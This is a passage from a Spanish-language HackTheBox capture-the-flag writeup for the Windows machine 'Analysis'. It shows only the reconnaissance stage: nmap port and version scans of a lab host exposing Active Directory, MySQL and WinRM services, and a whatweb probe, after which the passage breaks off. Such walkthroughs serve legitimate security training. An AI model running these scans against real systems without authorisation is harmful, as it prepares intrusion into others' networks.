18zm0-5q-.425 0-.712-.288T3 12t.288-.712T4 11h16q.425 0 .713.288T21 12t-.288.713T20 13zm0-5q-.425 0-.712-.288T3 7t.288-.712T4 6h16q.425 0 .713.288T21 7t-.288.713T20 8z" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:notes-rounded></use></svg></div><div class=text-sm>1354 palabras</div></div><div class="flex items-center flex-row"><div class="transition flex items-center justify-center bg-black/5 dark:bg-white/10 dark:text-white/50 h-6 mr-2 rounded-md text-black/50 w-6"><svg data-icon=material-symbols:schedule-outline-rounded height=1em viewBox="0 0 24 24" width=1em><symbol id=ai:material-symbols:schedule-outline-rounded><path d="M13 11.6V8q0-.425-.288-.712T12 7t-.712.288T11 8v3.975q0 .2.075.388t.225.337l3.3 3.3q.275.275.7.275T16 16t.275-.7t-.275-.7zM12 22q-2.075 0-3.9-.788t-3.175-2.137T2.788 15.9T2 12t.788-3.9t2.137-3.175T8.1 2.788T12 2t3.9.788t3.175 2.137T21.213 8.1T22 12t-.788 3.9t-2.137 3.175t-3.175 2.138T12 22m0-2q3.325 0 5.663-2.337T20 12t-2.337-5.663T12 4T6.337 6.338T4 12t2.338 5.663T12 20" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:schedule-outline-rounded></use></svg></div><div class=text-sm>7 minutos</div></div></div><div class="relative onload-animation"><div class="transition font-bold before:absolute before:bg-[var(--primary)] before:rounded-md before:h-5 before:left-[-1.125rem] before:top-[0.75rem] block dark:text-white/90 mb-3 md:before:w-1 md:text-[2.5rem]/[2.75rem] text-3xl text-black/90 w-full" data-pagefind-body data-pagefind-meta=title data-pagefind-weight=10>Analysis HTB Writeup</div></div><div class=onload-animation><div class="flex items-center gap-4 dark:text-neutral-400 flex-wrap gap-x-4 gap-y-2 mb-5 text-neutral-500" data-astro-cid-qtyrxm4s><div class="flex items-center" data-astro-cid-qtyrxm4s><div class=meta-icon data-astro-cid-qtyrxm4s><svg data-icon=material-symbols:calendar-today-outline-rounded height=1em viewBox="0 0 24 24" width=1em class=text-xl data-astro-cid-qtyrxm4s><symbol id=ai:material-symbols:calendar-today-outline-rounded><path d="M5 22q-.825 0-1.412-.587T3 20V6q0-.825.588-1.412T5 4h1V3q0-.425.288-.712T7 2t.713.288T8 3v1h8V3q0-.425.288-.712T17 2t.713.288T18 3v1h1q.825 0 1.413.588T21 6v14q0 .825-.587 1.413T19 22zm0-2h14V10H5zM5 8h14V6H5zm0 0V6z" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:calendar-today-outline-rounded></use></svg></div><span class="text-sm text-50 font-medium" data-astro-cid-qtyrxm4s>2024-06-21</span></div><div class="flex items-center" data-astro-cid-qtyrxm4s><div class=meta-icon data-astro-cid-qtyrxm4s><svg data-icon=material-symbols:book-2-outline-rounded height=1em viewBox="0 0 24 24" width=1em class=text-xl data-astro-cid-qtyrxm4s><symbol id=ai:material-symbols:book-2-outline-rounded><path d="M6 15.325q.35-.175.725-.25T7.5 15H8V4h-.5q-.625 0-1.062.438T6 5.5zM10 15h8V4h-8zm-4 .325V4zM7.5 22q-1.45 0-2.475-1.025T4 18.5v-13q0-1.45 1.025-2.475T7.5 2H18q.825 0 1.413.587T20 4v12.525q0 .2-.162.363t-.588.362q-.35.175-.55.5t-.2.75t.2.763t.55.487t.55.413t.2.562v.25q0 .425-.288.725T19 22zm0-2h9.325q-.15-.35-.237-.712T16.5 18.5q0-.4.075-.775t.25-.725H7.5q-.65 0-1.075.438T6 18.5q0 .65.425 1.075T7.5 20" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:book-2-outline-rounded></use></svg></div><div class="flex items-center flex-row flex-nowrap" data-astro-cid-qtyrxm4s><a href=/archive/category/HackTheBox/ class="transition whitespace-nowrap font-medium dark:hover:text-[var(--primary)] hover:text-[var(--primary)] link-lg text-50 text-sm" aria-label="View all posts in the HackTheBox category" data-astro-cid-qtyrxm4s>HackTheBox</a></div></div><div class="flex items-center" data-astro-cid-qtyrxm4s><div class=meta-icon data-astro-cid-qtyrxm4s><svg data-icon=material-symbols:tag-rounded height=1em viewBox="0 0 24 24" width=1em class=text-xl data-astro-cid-qtyrxm4s><symbol id=ai:material-symbols:tag-rounded><path d="m9 16l-.825 3.275q-.075.325-.325.525t-.6.2q-.475 0-.775-.375T6.3 18.8L7 16H4.275q-.5 0-.8-.387T3.3 14.75q.075-.35.35-.55t.625-.2H7.5l1-4H5.775q-.5 0-.8-.387T4.8 8.75q.075-.35.35-.55t.625-.2H9l.825-3.275Q9.9 4.4 10.15 4.2t.6-.2q.475 0 .775.375t.175.825L11 8h4l.825-3.275q.075-.325.325-.525t.6-.2q.475 0 .775.375t.175.825L17 8h2.725q.5 0 .8.387t.175.863q-.075.35-.35.55t-.625.2H16.5l-1 4h2.725q.5 0 .8.388t.175.862q-.075.35-.35.55t-.625.2H15l-.825 3.275q-.075.325-.325.525t-.6.2q-.475 0-.775-.375T12.3 18.8L13 16zm.5-2h4l1-4h-4z" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:tag-rounded></use></svg></div><div class="flex items-center flex-row flex-nowrap" data-astro-cid-qtyrxm4s><div class="text-sm mx-1.5 text-[var(--meta-divider)] hidden" data-astro-cid-qtyrxm4s>/</div><a href=/archive/tag/Hard/ class="transition whitespace-nowrap font-medium dark:hover:text-[var(--primary)] hover:text-[var(--primary)] link-lg text-50 text-sm" aria-label="View all posts with the Hard tag" data-astro-cid-qtyrxm4s>Hard</a><div class="text-sm mx-1.5 text-[var(--meta-divider)]" data-astro-cid-qtyrxm4s>/</div><a href=/archive/tag/Windows/ class="transition whitespace-nowrap font-medium dark:hover:text-[var(--primary)] hover:text-[var(--primary)] link-lg text-50 text-sm" aria-label="View all posts with the Windows tag" data-astro-cid-qtyrxm4s>Windows</a></div></div></div></div><div class="overflow-hidden relative rounded-xl onload-animation banner-container mb-8" id=post-cover><div class="transition absolute pointer-events-none bg-opacity-50 dark:bg-black/10 inset-0"></div><img alt="" decoding=async height=375 loading=lazy src=/_astro/image.DKksDhG8_1zyjEf.webp width=666 class="w-full h-full object-cover" style=object-position:center></div><div class="onload-animation mb-6 custom-md dark:prose-invert markdown-content max-w-none prose prose-base" data-pagefind-body><h1 id=information-gathering>Information Gathering<a href=#information-gathering class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h1><p>Comenzamos nuestros escaneos con nmap.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#f97583>></span><span style=color:#e1e4e8> sudo nmap -sS -p- --open --min-rate 3000 -n -Pn -vvv 10.10.11.250 -oN Nmap </span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>PORT</span><span style=color:#9ecbff>      STATE</span><span style=color:#9ecbff> SERVICE</span><span style=color:#9ecbff>          REASON</span></span>
<span class=line><span style=color:#b392f0>53/tcp</span><span style=color:#9ecbff>    open</span><span style=color:#9ecbff>  domain</span><span style=color:#9ecbff>           syn-ack</span><span style=color:#9ecbff> ttl</span><span style=color:#79b8ff> 127</span></span>
<span class=line><span style=color:#b392f0>80/tcp</span><span style=color:#9ecbff>    open</span><span style=color:#9ecbff>  http</span><span style=color:#9ecbff>             syn-ack</span><span style=color:#9ecbff> ttl</span><span style=color:#79b8ff> 127</span></span>
<span class=line><span style=color:#b392f0>88/tcp</span><span style=color:#9ecbff>    open</span><span style=color:#9ecbff>  kerberos-sec</span><span style=color:#9ecbff>     syn-ack</span><span style=color:#9ecbff> ttl</span><span style=color:#79b8ff> 127</span></span>
<span class=line><span style=color:#b392f0>135/tcp</span><span style=color:#9ecbff>   open</span><span style=color:#9ecbff>  msrpc</span><span style=color:#9ecbff>            syn-ack</span><span style=color:#9ecbff> ttl</span><span style=color:#79b8ff> 127</span></span>
<span class=line><span style=color:#b392f0>139/tcp</span><span style=color:#9ecbff>   open</span><span style=color:#9ecbff>  netbios-ssn</span><span style=color:#9ecbff>      syn-ack</span><span style=color:#9ecbff> ttl</span><span style=color:#79b8ff> 127</span></span>
<span class=line><span style=color:#b392f0>389/tcp</span><span style=color:#9ecbff>   open</span><span style=color:#9ecbff>  ldap</span><span style=color:#9ecbff>             syn-ack</span><span style=color:#9ecbff> ttl</span><span style=color:#79b8ff> 127</span></span>
<span class=line><span style=color:#b392f0>445/tcp</span><span style=color:#9ecbff>   open</span><span style=color:#9ecbff>  microsoft-ds</span><span style=color:#9ecbff>     syn-ack</span><span style=color:#9ecbff> ttl</span><span style=color:#79b8ff> 127</span></span>
<span class=line><span style=color:#b392f0>464/tcp</span><span style=color:#9ecbff>   open</span><span style=color:#9ecbff>  kpasswd5</span><span style=color:#9ecbff>         syn-ack</span><span style=color:#9ecbff> ttl</span><span style=color:#79b8ff> 127</span></span>
<span class=line><span style=color:#b392f0>593/tcp</span><span style=color:#9ecbff>   open</span><span style=color:#9ecbff>  http-rpc-epmap</span><span style=color:#9ecbff>   syn-ack</span><span style=color:#9ecbff> ttl</span><span style=color:#79b8ff> 127</span></span>
<span class=line><span style=color:#b392f0>636/tcp</span><span style=color:#9ecbff>   open</span><span style=color:#9ecbff>  ldapssl</span><span style=color:#9ecbff>          syn-ack</span><span style=color:#9ecbff> ttl</span><span style=color:#79b8ff> 127</span></span>
<span class=line><span style=color:#b392f0>3268/tcp</span><span style=color:#9ecbff>  open</span><span style=color:#9ecbff>  globalcatLDAP</span><span style=color:#9ecbff>    syn-ack</span><span style=color:#9ecbff> ttl</span><span style=color:#79b8ff> 127</span></span>
<span class=line><span style=color:#b392f0>3269/tcp</span><span style=color:#9ecbff>  open</span><span style=color:#9ecbff>  globalcatLDAPssl</span><span style=color:#9ecbff> syn-ack</span><span style=color:#9ecbff> ttl</span><span style=color:#79b8ff> 127</span></span>
<span class=line><span style=color:#b392f0>3306/tcp</span><span style=color:#9ecbff>  open</span><span style=color:#9ecbff>  mysql</span><span style=color:#9ecbff>            syn-ack</span><span style=color:#9ecbff> ttl</span><span style=color:#79b8ff> 127</span></span>
<span class=line><span style=color:#b392f0>5985/tcp</span><span style=color:#9ecbff>  open</span><span style=color:#9ecbff>  wsman</span><span style=color:#9ecbff>            syn-ack</span><span style=color:#9ecbff> ttl</span><span style=color:#79b8ff> 127</span></span>
<span class=line><span style=color:#b392f0>9389/tcp</span><span style=color:#9ecbff>  open</span><span style=color:#9ecbff>  adws</span><span style=color:#9ecbff>             syn-ack</span><span style=color:#9ecbff> ttl</span><span style=color:#79b8ff> 127</span></span>
<span class=line><span style=color:#b392f0>33060/tcp</span><span style=color:#9ecbff> open</span><span style=color:#9ecbff>  mysqlx</span><span style=color:#9ecbff>           syn-ack</span><span style=color:#9ecbff> ttl</span><span style=color:#79b8ff> 127</span></span>
<span class=line><span style=color:#b392f0>47001/tcp</span><span style=color:#9ecbff> open</span><span style=color:#9ecbff>  winrm</span><span style=color:#9ecbff>            syn-ack</span><span style=color:#9ecbff> ttl</span><span style=color:#79b8ff> 127</span></span>
<span class=line><span style=color:#b392f0>49664/tcp</span><span style=color:#9ecbff> open</span><span style=color:#9ecbff>  unknown</span><span style=color:#9ecbff>          syn-ack</span><span style=color:#9ecbff> ttl</span><span style=color:#79b8ff> 127</span></span>
<span class=line><span style=color:#b392f0>49665/tcp</span><span style=color:#9ecbff> open</span><span style=color:#9ecbff>  unknown</span><span style=color:#9ecbff>          syn-ack</span><span style=color:#9ecbff> ttl</span><span style=color:#79b8ff> 127</span></span>
<span class=line><span style=color:#b392f0>49666/tcp</span><span style=color:#9ecbff> open</span><span style=color:#9ecbff>  unknown</span><span style=color:#9ecbff>          syn-ack</span><span style=color:#9ecbff> ttl</span><span style=color:#79b8ff> 127</span></span>
<span class=line><span style=color:#b392f0>49667/tcp</span><span style=color:#9ecbff> open</span><span style=color:#9ecbff>  unknown</span><span style=color:#9ecbff>          syn-ack</span><span style=color:#9ecbff> ttl</span><span style=color:#79b8ff> 127</span></span>
<span class=line><span style=color:#b392f0>49671/tcp</span><span style=color:#9ecbff> open</span><span style=color:#9ecbff>  unknown</span><span style=color:#9ecbff>          syn-ack</span><span style=color:#9ecbff> ttl</span><span style=color:#79b8ff> 127</span></span>
<span class=line><span style=color:#b392f0>49674/tcp</span><span style=color:#9ecbff> open</span><span style=color:#9ecbff>  unknown</span><span style=color:#9ecbff>          syn-ack</span><span style=color:#9ecbff> ttl</span><span style=color:#79b8ff> 127</span></span>
<span class=line><span style=color:#b392f0>49675/tcp</span><span style=color:#9ecbff> open</span><span style=color:#9ecbff>  unknown</span><span style=color:#9ecbff>          syn-ack</span><span style=color:#9ecbff> ttl</span><span style=color:#79b8ff> 127</span></span>
<span class=line><span style=color:#b392f0>49676/tcp</span><span style=color:#9ecbff> open</span><span style=color:#9ecbff>  unknown</span><span style=color:#9ecbff>          syn-ack</span><span style=color:#9ecbff> ttl</span><span style=color:#79b8ff> 127</span></span>
<span class=line><span style=color:#b392f0>49677/tcp</span><span style=color:#9ecbff> open</span><span style=color:#9ecbff>  unknown</span><span style=color:#9ecbff>          syn-ack</span><span style=color:#9ecbff> ttl</span><span style=color:#79b8ff> 127</span></span>
<span class=line><span style=color:#b392f0>49682/tcp</span><span style=color:#9ecbff> open</span><span style=color:#9ecbff>  unknown</span><span style=color:#9ecbff>          syn-ack</span><span style=color:#9ecbff> ttl</span><span style=color:#79b8ff> 127</span></span>
<span class=line><span style=color:#b392f0>49732/tcp</span><span style=color:#9ecbff> open</span><span style=color:#9ecbff>  unknown</span><span style=color:#9ecbff>          syn-ack</span><span style=color:#9ecbff> ttl</span><span style=color:#79b8ff> 127</span></span>
<span class=line><span style=color:#b392f0>63270/tcp</span><span style=color:#9ecbff> open</span><span style=color:#9ecbff>  unknown</span><span style=color:#9ecbff>          syn-ack</span><span style=color:#9ecbff> ttl</span><span style=color:#79b8ff> 127</span></span>
<span class=line></span></code></pre><h2 id=nmap-version-scan>Nmap version Scan<a href=#nmap-version-scan class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h2><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#f97583>></span><span style=color:#e1e4e8> sudo nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,3306,5985,9389,33060,47001,49664,49665,49666,49667,49671,49674,49675,49676,49677,49682,49732,6327 -sCV 10.10.11.250 -oN Ports</span></span>
<span class=line></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>Starting</span><span style=color:#9ecbff> Nmap</span><span style=color:#9ecbff> 7.94SVN</span><span style=color:#e1e4e8> ( </span><span style=color:#9ecbff>https://nmap.org</span><span style=color:#e1e4e8> ) at 2024-06-05 19:49 EDT</span></span>
<span class=line><span style=color:#b392f0>Nmap</span><span style=color:#9ecbff> scan</span><span style=color:#9ecbff> report</span><span style=color:#9ecbff> for</span><span style=color:#79b8ff> 10.10.11.250</span><span style=color:#e1e4e8> (10.10.11.250)</span></span>
<span class=line><span style=color:#b392f0>Host</span><span style=color:#9ecbff> is</span><span style=color:#9ecbff> up</span><span style=color:#e1e4e8> (0.11s </span><span style=color:#9ecbff>latency</span><span style=color:#e1e4e8>).</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>PORT</span><span style=color:#9ecbff>      STATE</span><span style=color:#9ecbff>  SERVICE</span><span style=color:#9ecbff>       VERSION</span></span>
<span class=line><span style=color:#b392f0>53/tcp</span><span style=color:#9ecbff>    open</span><span style=color:#9ecbff>   domain</span><span style=color:#9ecbff>        Simple</span><span style=color:#9ecbff> DNS</span><span style=color:#9ecbff> Plus</span></span>
<span class=line><span style=color:#b392f0>80/tcp</span><span style=color:#9ecbff>    open</span><span style=color:#9ecbff>   http</span><span style=color:#9ecbff>          Microsoft</span><span style=color:#9ecbff> HTTPAPI</span><span style=color:#9ecbff> httpd</span><span style=color:#79b8ff> 2.0</span><span style=color:#e1e4e8> (SSDP/UPnP)</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0>_http-server-header:</span><span style=color:#9ecbff> Microsoft-HTTPAPI/2.0</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0>_http-title:</span><span style=color:#9ecbff> Not</span><span style=color:#9ecbff> Found</span></span>
<span class=line><span style=color:#b392f0>88/tcp</span><span style=color:#9ecbff>    open</span><span style=color:#9ecbff>   kerberos-sec</span><span style=color:#9ecbff>  Microsoft</span><span style=color:#9ecbff> Windows</span><span style=color:#9ecbff> Kerberos</span><span style=color:#e1e4e8> (server </span><span style=color:#9ecbff>time:</span><span style=color:#9ecbff> 2024-06-05</span><span style=color:#9ecbff> 23:55:03Z</span><span style=color:#e1e4e8>)</span></span>
<span class=line><span style=color:#b392f0>135/tcp</span><span style=color:#9ecbff>   open</span><span style=color:#9ecbff>   msrpc</span><span style=color:#9ecbff>         Microsoft</span><span style=color:#9ecbff> Windows</span><span style=color:#9ecbff> RPC</span></span>
<span class=line><span style=color:#b392f0>139/tcp</span><span style=color:#9ecbff>   open</span><span style=color:#9ecbff>   netbios-ssn</span><span style=color:#9ecbff>   Microsoft</span><span style=color:#9ecbff> Windows</span><span style=color:#9ecbff> netbios-ssn</span></span>
<span class=line><span style=color:#b392f0>389/tcp</span><span style=color:#9ecbff>   open</span><span style=color:#9ecbff>   ldap</span><span style=color:#9ecbff>          Microsoft</span><span style=color:#9ecbff> Windows</span><span style=color:#9ecbff> Active</span><span style=color:#9ecbff> Directory</span><span style=color:#9ecbff> LDAP</span><span style=color:#e1e4e8> (Domain: </span><span style=color:#9ecbff>analysis.htb0.,</span><span style=color:#9ecbff> Site:</span><span style=color:#9ecbff> Default-First-Site-Name</span><span style=color:#e1e4e8>)</span></span>
<span class=line><span style=color:#b392f0>445/tcp</span><span style=color:#9ecbff>   open</span><span style=color:#9ecbff>   microsoft-ds?</span></span>
<span class=line><span style=color:#b392f0>464/tcp</span><span style=color:#9ecbff>   open</span><span style=color:#9ecbff>   kpasswd5?</span></span>
<span class=line><span style=color:#b392f0>593/tcp</span><span style=color:#9ecbff>   open</span><span style=color:#9ecbff>   ncacn_http</span><span style=color:#9ecbff>    Microsoft</span><span style=color:#9ecbff> Windows</span><span style=color:#9ecbff> RPC</span><span style=color:#9ecbff> over</span><span style=color:#9ecbff> HTTP</span><span style=color:#79b8ff> 1.0</span></span>
<span class=line><span style=color:#b392f0>636/tcp</span><span style=color:#9ecbff>   open</span><span style=color:#9ecbff>   tcpwrapped</span></span>
<span class=line><span style=color:#b392f0>3268/tcp</span><span style=color:#9ecbff>  open</span><span style=color:#9ecbff>   ldap</span><span style=color:#9ecbff>          Microsoft</span><span style=color:#9ecbff> Windows</span><span style=color:#9ecbff> Active</span><span style=color:#9ecbff> Directory</span><span style=color:#9ecbff> LDAP</span><span style=color:#e1e4e8> (Domain: </span><span style=color:#9ecbff>analysis.htb0.,</span><span style=color:#9ecbff> Site:</span><span style=color:#9ecbff> Default-First-Site-Name</span><span style=color:#e1e4e8>)</span></span>
<span class=line><span style=color:#b392f0>3269/tcp</span><span style=color:#9ecbff>  open</span><span style=color:#9ecbff>   tcpwrapped</span></span>
<span class=line><span style=color:#b392f0>3306/tcp</span><span style=color:#9ecbff>  open</span><span style=color:#9ecbff>   mysql</span><span style=color:#9ecbff>         MySQL</span><span style=color:#e1e4e8> (unauthorized)</span></span>
<span class=line><span style=color:#b392f0>5985/tcp</span><span style=color:#9ecbff>  open</span><span style=color:#9ecbff>   http</span><span style=color:#9ecbff>          Microsoft</span><span style=color:#9ecbff> HTTPAPI</span><span style=color:#9ecbff> httpd</span><span style=color:#79b8ff> 2.0</span><span style=color:#e1e4e8> (SSDP/UPnP)</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0>_http-server-header:</span><span style=color:#9ecbff> Microsoft-HTTPAPI/2.0</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0>_http-title:</span><span style=color:#9ecbff> Not</span><span style=color:#9ecbff> Found</span></span>
<span class=line><span style=color:#b392f0>6327/tcp</span><span style=color:#9ecbff>  closed</span><span style=color:#9ecbff> unknown</span></span>
<span class=line><span style=color:#b392f0>9389/tcp</span><span style=color:#9ecbff>  open</span><span style=color:#9ecbff>   mc-nmf</span><span style=color:#9ecbff>        .NET</span><span style=color:#9ecbff> Message</span><span style=color:#9ecbff> Framing</span></span>
<span class=line><span style=color:#b392f0>33060/tcp</span><span style=color:#9ecbff> open</span><span style=color:#9ecbff>   mysqlx?</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> fingerprint-strings:</span><span style=color:#e1e4e8> </span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0>   DNSStatusRequestTCP,</span><span style=color:#9ecbff> LDAPSearchReq,</span><span style=color:#9ecbff> NotesRPC,</span><span style=color:#9ecbff> SSLSessionReq,</span><span style=color:#9ecbff> X11Probe:</span><span style=color:#e1e4e8> </span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0>     Invalid</span><span style=color:#9ecbff> message"</span></span>
<span class=line><span style=color:#9ecbff>|     HY000</span></span>
<span class=line><span style=color:#9ecbff>|   LDAPBindReq: </span></span>
<span class=line><span style=color:#9ecbff>|     *Parse error unserializing protobuf message"</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0>     HY000</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0>   oracle-tns:</span><span style=color:#e1e4e8> </span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0>     Invalid</span><span style=color:#9ecbff> message-frame."</span></span>
<span class=line><span style=color:#9ecbff>|_    HY000</span></span>
<span class=line><span style=color:#9ecbff>47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span></span>
<span class=line><span style=color:#9ecbff>|_http-title: Not Found</span></span>
<span class=line><span style=color:#9ecbff>|_http-server-header: Microsoft-HTTPAPI/2.0</span></span>
<span class=line><span style=color:#9ecbff>49664/tcp open   msrpc         Microsoft Windows RPC</span></span>
<span class=line><span style=color:#9ecbff>49665/tcp open   msrpc         Microsoft Windows RPC</span></span>
<span class=line><span style=color:#9ecbff>49666/tcp open   msrpc         Microsoft Windows RPC</span></span>
<span class=line><span style=color:#9ecbff>49667/tcp open   msrpc         Microsoft Windows RPC</span></span>
<span class=line><span style=color:#9ecbff>49671/tcp open   msrpc         Microsoft Windows RPC</span></span>
<span class=line><span style=color:#9ecbff>49674/tcp open   ncacn_http    Microsoft Windows RPC over HTTP 1.0</span></span>
<span class=line><span style=color:#9ecbff>49675/tcp open   msrpc         Microsoft Windows RPC</span></span>
<span class=line><span style=color:#9ecbff>49676/tcp open   msrpc         Microsoft Windows RPC</span></span>
<span class=line><span style=color:#9ecbff>49677/tcp open   msrpc         Microsoft Windows RPC</span></span>
<span class=line><span style=color:#9ecbff>49682/tcp open   msrpc         Microsoft Windows RPC</span></span>
<span class=line><span style=color:#9ecbff>49732/tcp open   msrpc         Microsoft Windows RPC</span></span>
<span class=line><span style=color:#9ecbff>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span></span>
<span class=line><span style=color:#9ecbff>SF-Port33060-TCP:V=7.94SVN%I=7%D=6/5%Time=6660F9B2%P=x86_64-pc-linux-gnu%r</span></span>
<span class=line><span style=color:#9ecbff>SF:(GenericLines,9,"</span><span style=color:#79b8ff>\x</span><span style=color:#9ecbff>05</span><span style=color:#79b8ff>\0\0\0\x</span><span style=color:#9ecbff>0b</span><span style=color:#79b8ff>\x</span><span style=color:#9ecbff>08</span><span style=color:#79b8ff>\x</span><span style=color:#9ecbff>05</span><span style=color:#79b8ff>\x</span><span style=color:#9ecbff>1a</span><span style=color:#79b8ff>\0</span><span style=color:#9ecbff>")%r(GetRequest,9,"</span><span style=color:#79b8ff>\x</span><span style=color:#9ecbff>05</span><span style=color:#79b8ff>\0\</span></span>
<span class=line><span style=color:#e1e4e8>SF:0</span><span style=color:#79b8ff>\0\x</span><span style=color:#e1e4e8>0b</span><span style=color:#79b8ff>\x</span><span style=color:#e1e4e8>08</span><span style=color:#79b8ff>\x</span><span style=color:#e1e4e8>05</span><span style=color:#79b8ff>\x</span><span style=color:#e1e4e8>1a</span><span style=color:#79b8ff>\0</span><span style=color:#9ecbff>")%r(HTTPOptions,9,"</span><span style=color:#79b8ff>\x</span><span style=color:#e1e4e8>05</span><span style=color:#79b8ff>\0\0\0\x</span><span style=color:#e1e4e8>0b</span><span style=color:#79b8ff>\x</span><span style=color:#e1e4e8>08</span><span style=color:#79b8ff>\x</span><span style=color:#e1e4e8>05</span><span style=color:#79b8ff>\x</span><span style=color:#e1e4e8>1a</span><span style=color:#79b8ff>\0</span><span style=color:#9ecbff>")</span></span>
<span class=line><span style=color:#9ecbff>SF:%r(RTSPRequest,9,"</span><span style=color:#79b8ff>\x</span><span style=color:#e1e4e8>05</span><span style=color:#79b8ff>\0\0\0\x</span><span style=color:#e1e4e8>0b</span><span style=color:#79b8ff>\x</span><span style=color:#e1e4e8>08</span><span style=color:#79b8ff>\x</span><span style=color:#e1e4e8>05</span><span style=color:#79b8ff>\x</span><span style=color:#e1e4e8>1a</span><span style=color:#79b8ff>\0</span><span style=color:#9ecbff>")%r(RPCCheck,9,"</span><span style=color:#79b8ff>\x</span><span style=color:#e1e4e8>05</span><span style=color:#79b8ff>\0\0</span></span>
<span class=line><span style=color:#b392f0>SF:\0\x0b\x08\x05\x1a\0</span><span style=color:#b392f0>")%r(DNSVersionBindReqTCP,9,"</span><span style=color:#b392f0>\x05\0\0\0\x0b\x08\x05</span></span>
<span class=line><span style=color:#b392f0>SF:\x1a\0</span><span style=color:#b392f0>")%r(DNSStatusRequestTCP,2B,"</span><span style=color:#b392f0>\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0</span></span>
<span class=line><span style=color:#b392f0>SF:\0\x01\x08\x01\x10\x88</span><span style=color:#b392f0>'\x1a\x0fInvalid\x20message\"\x05HY000")%r(Help,9</span></span>
<span class=line><span style=color:#b392f0>SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08</span></span>
<span class=line><span style=color:#b392f0>SF:\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'</span><span style=color:#b392f0>\x1a\x0fInvalid\x20message\</span><span style=color:#b392f0>"\x</span></span>
<span class=line><span style=color:#b392f0>SF:05HY000"</span><span style=color:#e1e4e8>)%r(</span><span style=color:#b392f0>TerminalServerCookie,9,</span><span style=color:#b392f0>"\x05\0\0\0\x0b\x08\x05\x1a\0"</span><span style=color:#e1e4e8>)%r(</span><span style=color:#b392f0>Ke</span></span>
<span class=line><span style=color:#b392f0>SF:rberos,9,</span><span style=color:#b392f0>"\x05\0\0\0\x0b\x08\x05\x1a\0"</span><span style=color:#e1e4e8>)%r(</span><span style=color:#b392f0>SMBProgNeg,9,</span><span style=color:#b392f0>"\x05\0\0\0\x0b</span></span>
<span class=line><span style=color:#b392f0>SF:\x08\x05\x1a\0"</span><span style=color:#e1e4e8>)%r(</span><span style=color:#b392f0>X11Probe,2B,</span><span style=color:#b392f0>"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0</span><span style=color:#79b8ff>\</span></span>
<span class=line><span style=color:#b392f0>SF:x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message</span><span style=color:#79b8ff>\"</span><span style=color:#b392f0>\x05HY000"</span><span style=color:#e1e4e8>)%r(</span><span style=color:#b392f0>FourOhFou</span></span>
<span class=line><span style=color:#b392f0>SF:rRequest,9,</span><span style=color:#b392f0>"\x05\0\0\0\x0b\x08\x05\x1a\0"</span><span style=color:#e1e4e8>)%r(</span><span style=color:#b392f0>LPDString,9,</span><span style=color:#b392f0>"\x05\0\0\0\x0</span></span>
<span class=line><span style=color:#b392f0>SF:b\x08\x05\x1a\0"</span><span style=color:#e1e4e8>)%r(</span><span style=color:#b392f0>LDAPSearchReq,2B,</span><span style=color:#b392f0>"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e</span><span style=color:#79b8ff>\</span></span>
<span class=line><span style=color:#b392f0>SF:0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message</span><span style=color:#79b8ff>\"</span><span style=color:#b392f0>\x05HY000"</span><span style=color:#e1e4e8>)%r(</span><span style=color:#b392f0>LDA</span></span>
<span class=line><span style=color:#b392f0>SF:PBindReq,46,</span><span style=color:#b392f0>"\x05</span></span>
<span class=line></span></code></pre><h1 id=enumeration>Enumeration<a href=#enumeration class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h1><p><img alt="alt text" decoding=async height=634 loading=lazy src=/_astro/image-1.CKHSfQfD_26sQ0u.webp width=1001></p><p>intentamos ejecutar whatweb:</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#f97583>></span><span style=color:#e1e4e8> whatweb http://analysis.htb/ </span></span>
<span class=line><span style=color:#b392f0>http://analysis.htb/</span><span style=color:#e1e4e8> [200 </span><span style=color:#9ecbff>OK]</span><span style=color:#9ecbff> Country[RESERVED][ZZ],</span><span style=color:#9ecbff> Email[mail@demolink.org,privacy@demolink.org],</span><span style=color:#9ecbff> HTTPServer[Microsoft-IIS/10.0],</span><span style=color:#9ecbff> IP[10.10.11.250],</span><span style=color:#9ecbff> JQuery,</span><span style=color:#9ecbff> Microsoft-IIS[10.0],</span><span style=color:#9ecbff> Script[text/javascript]</span></span>
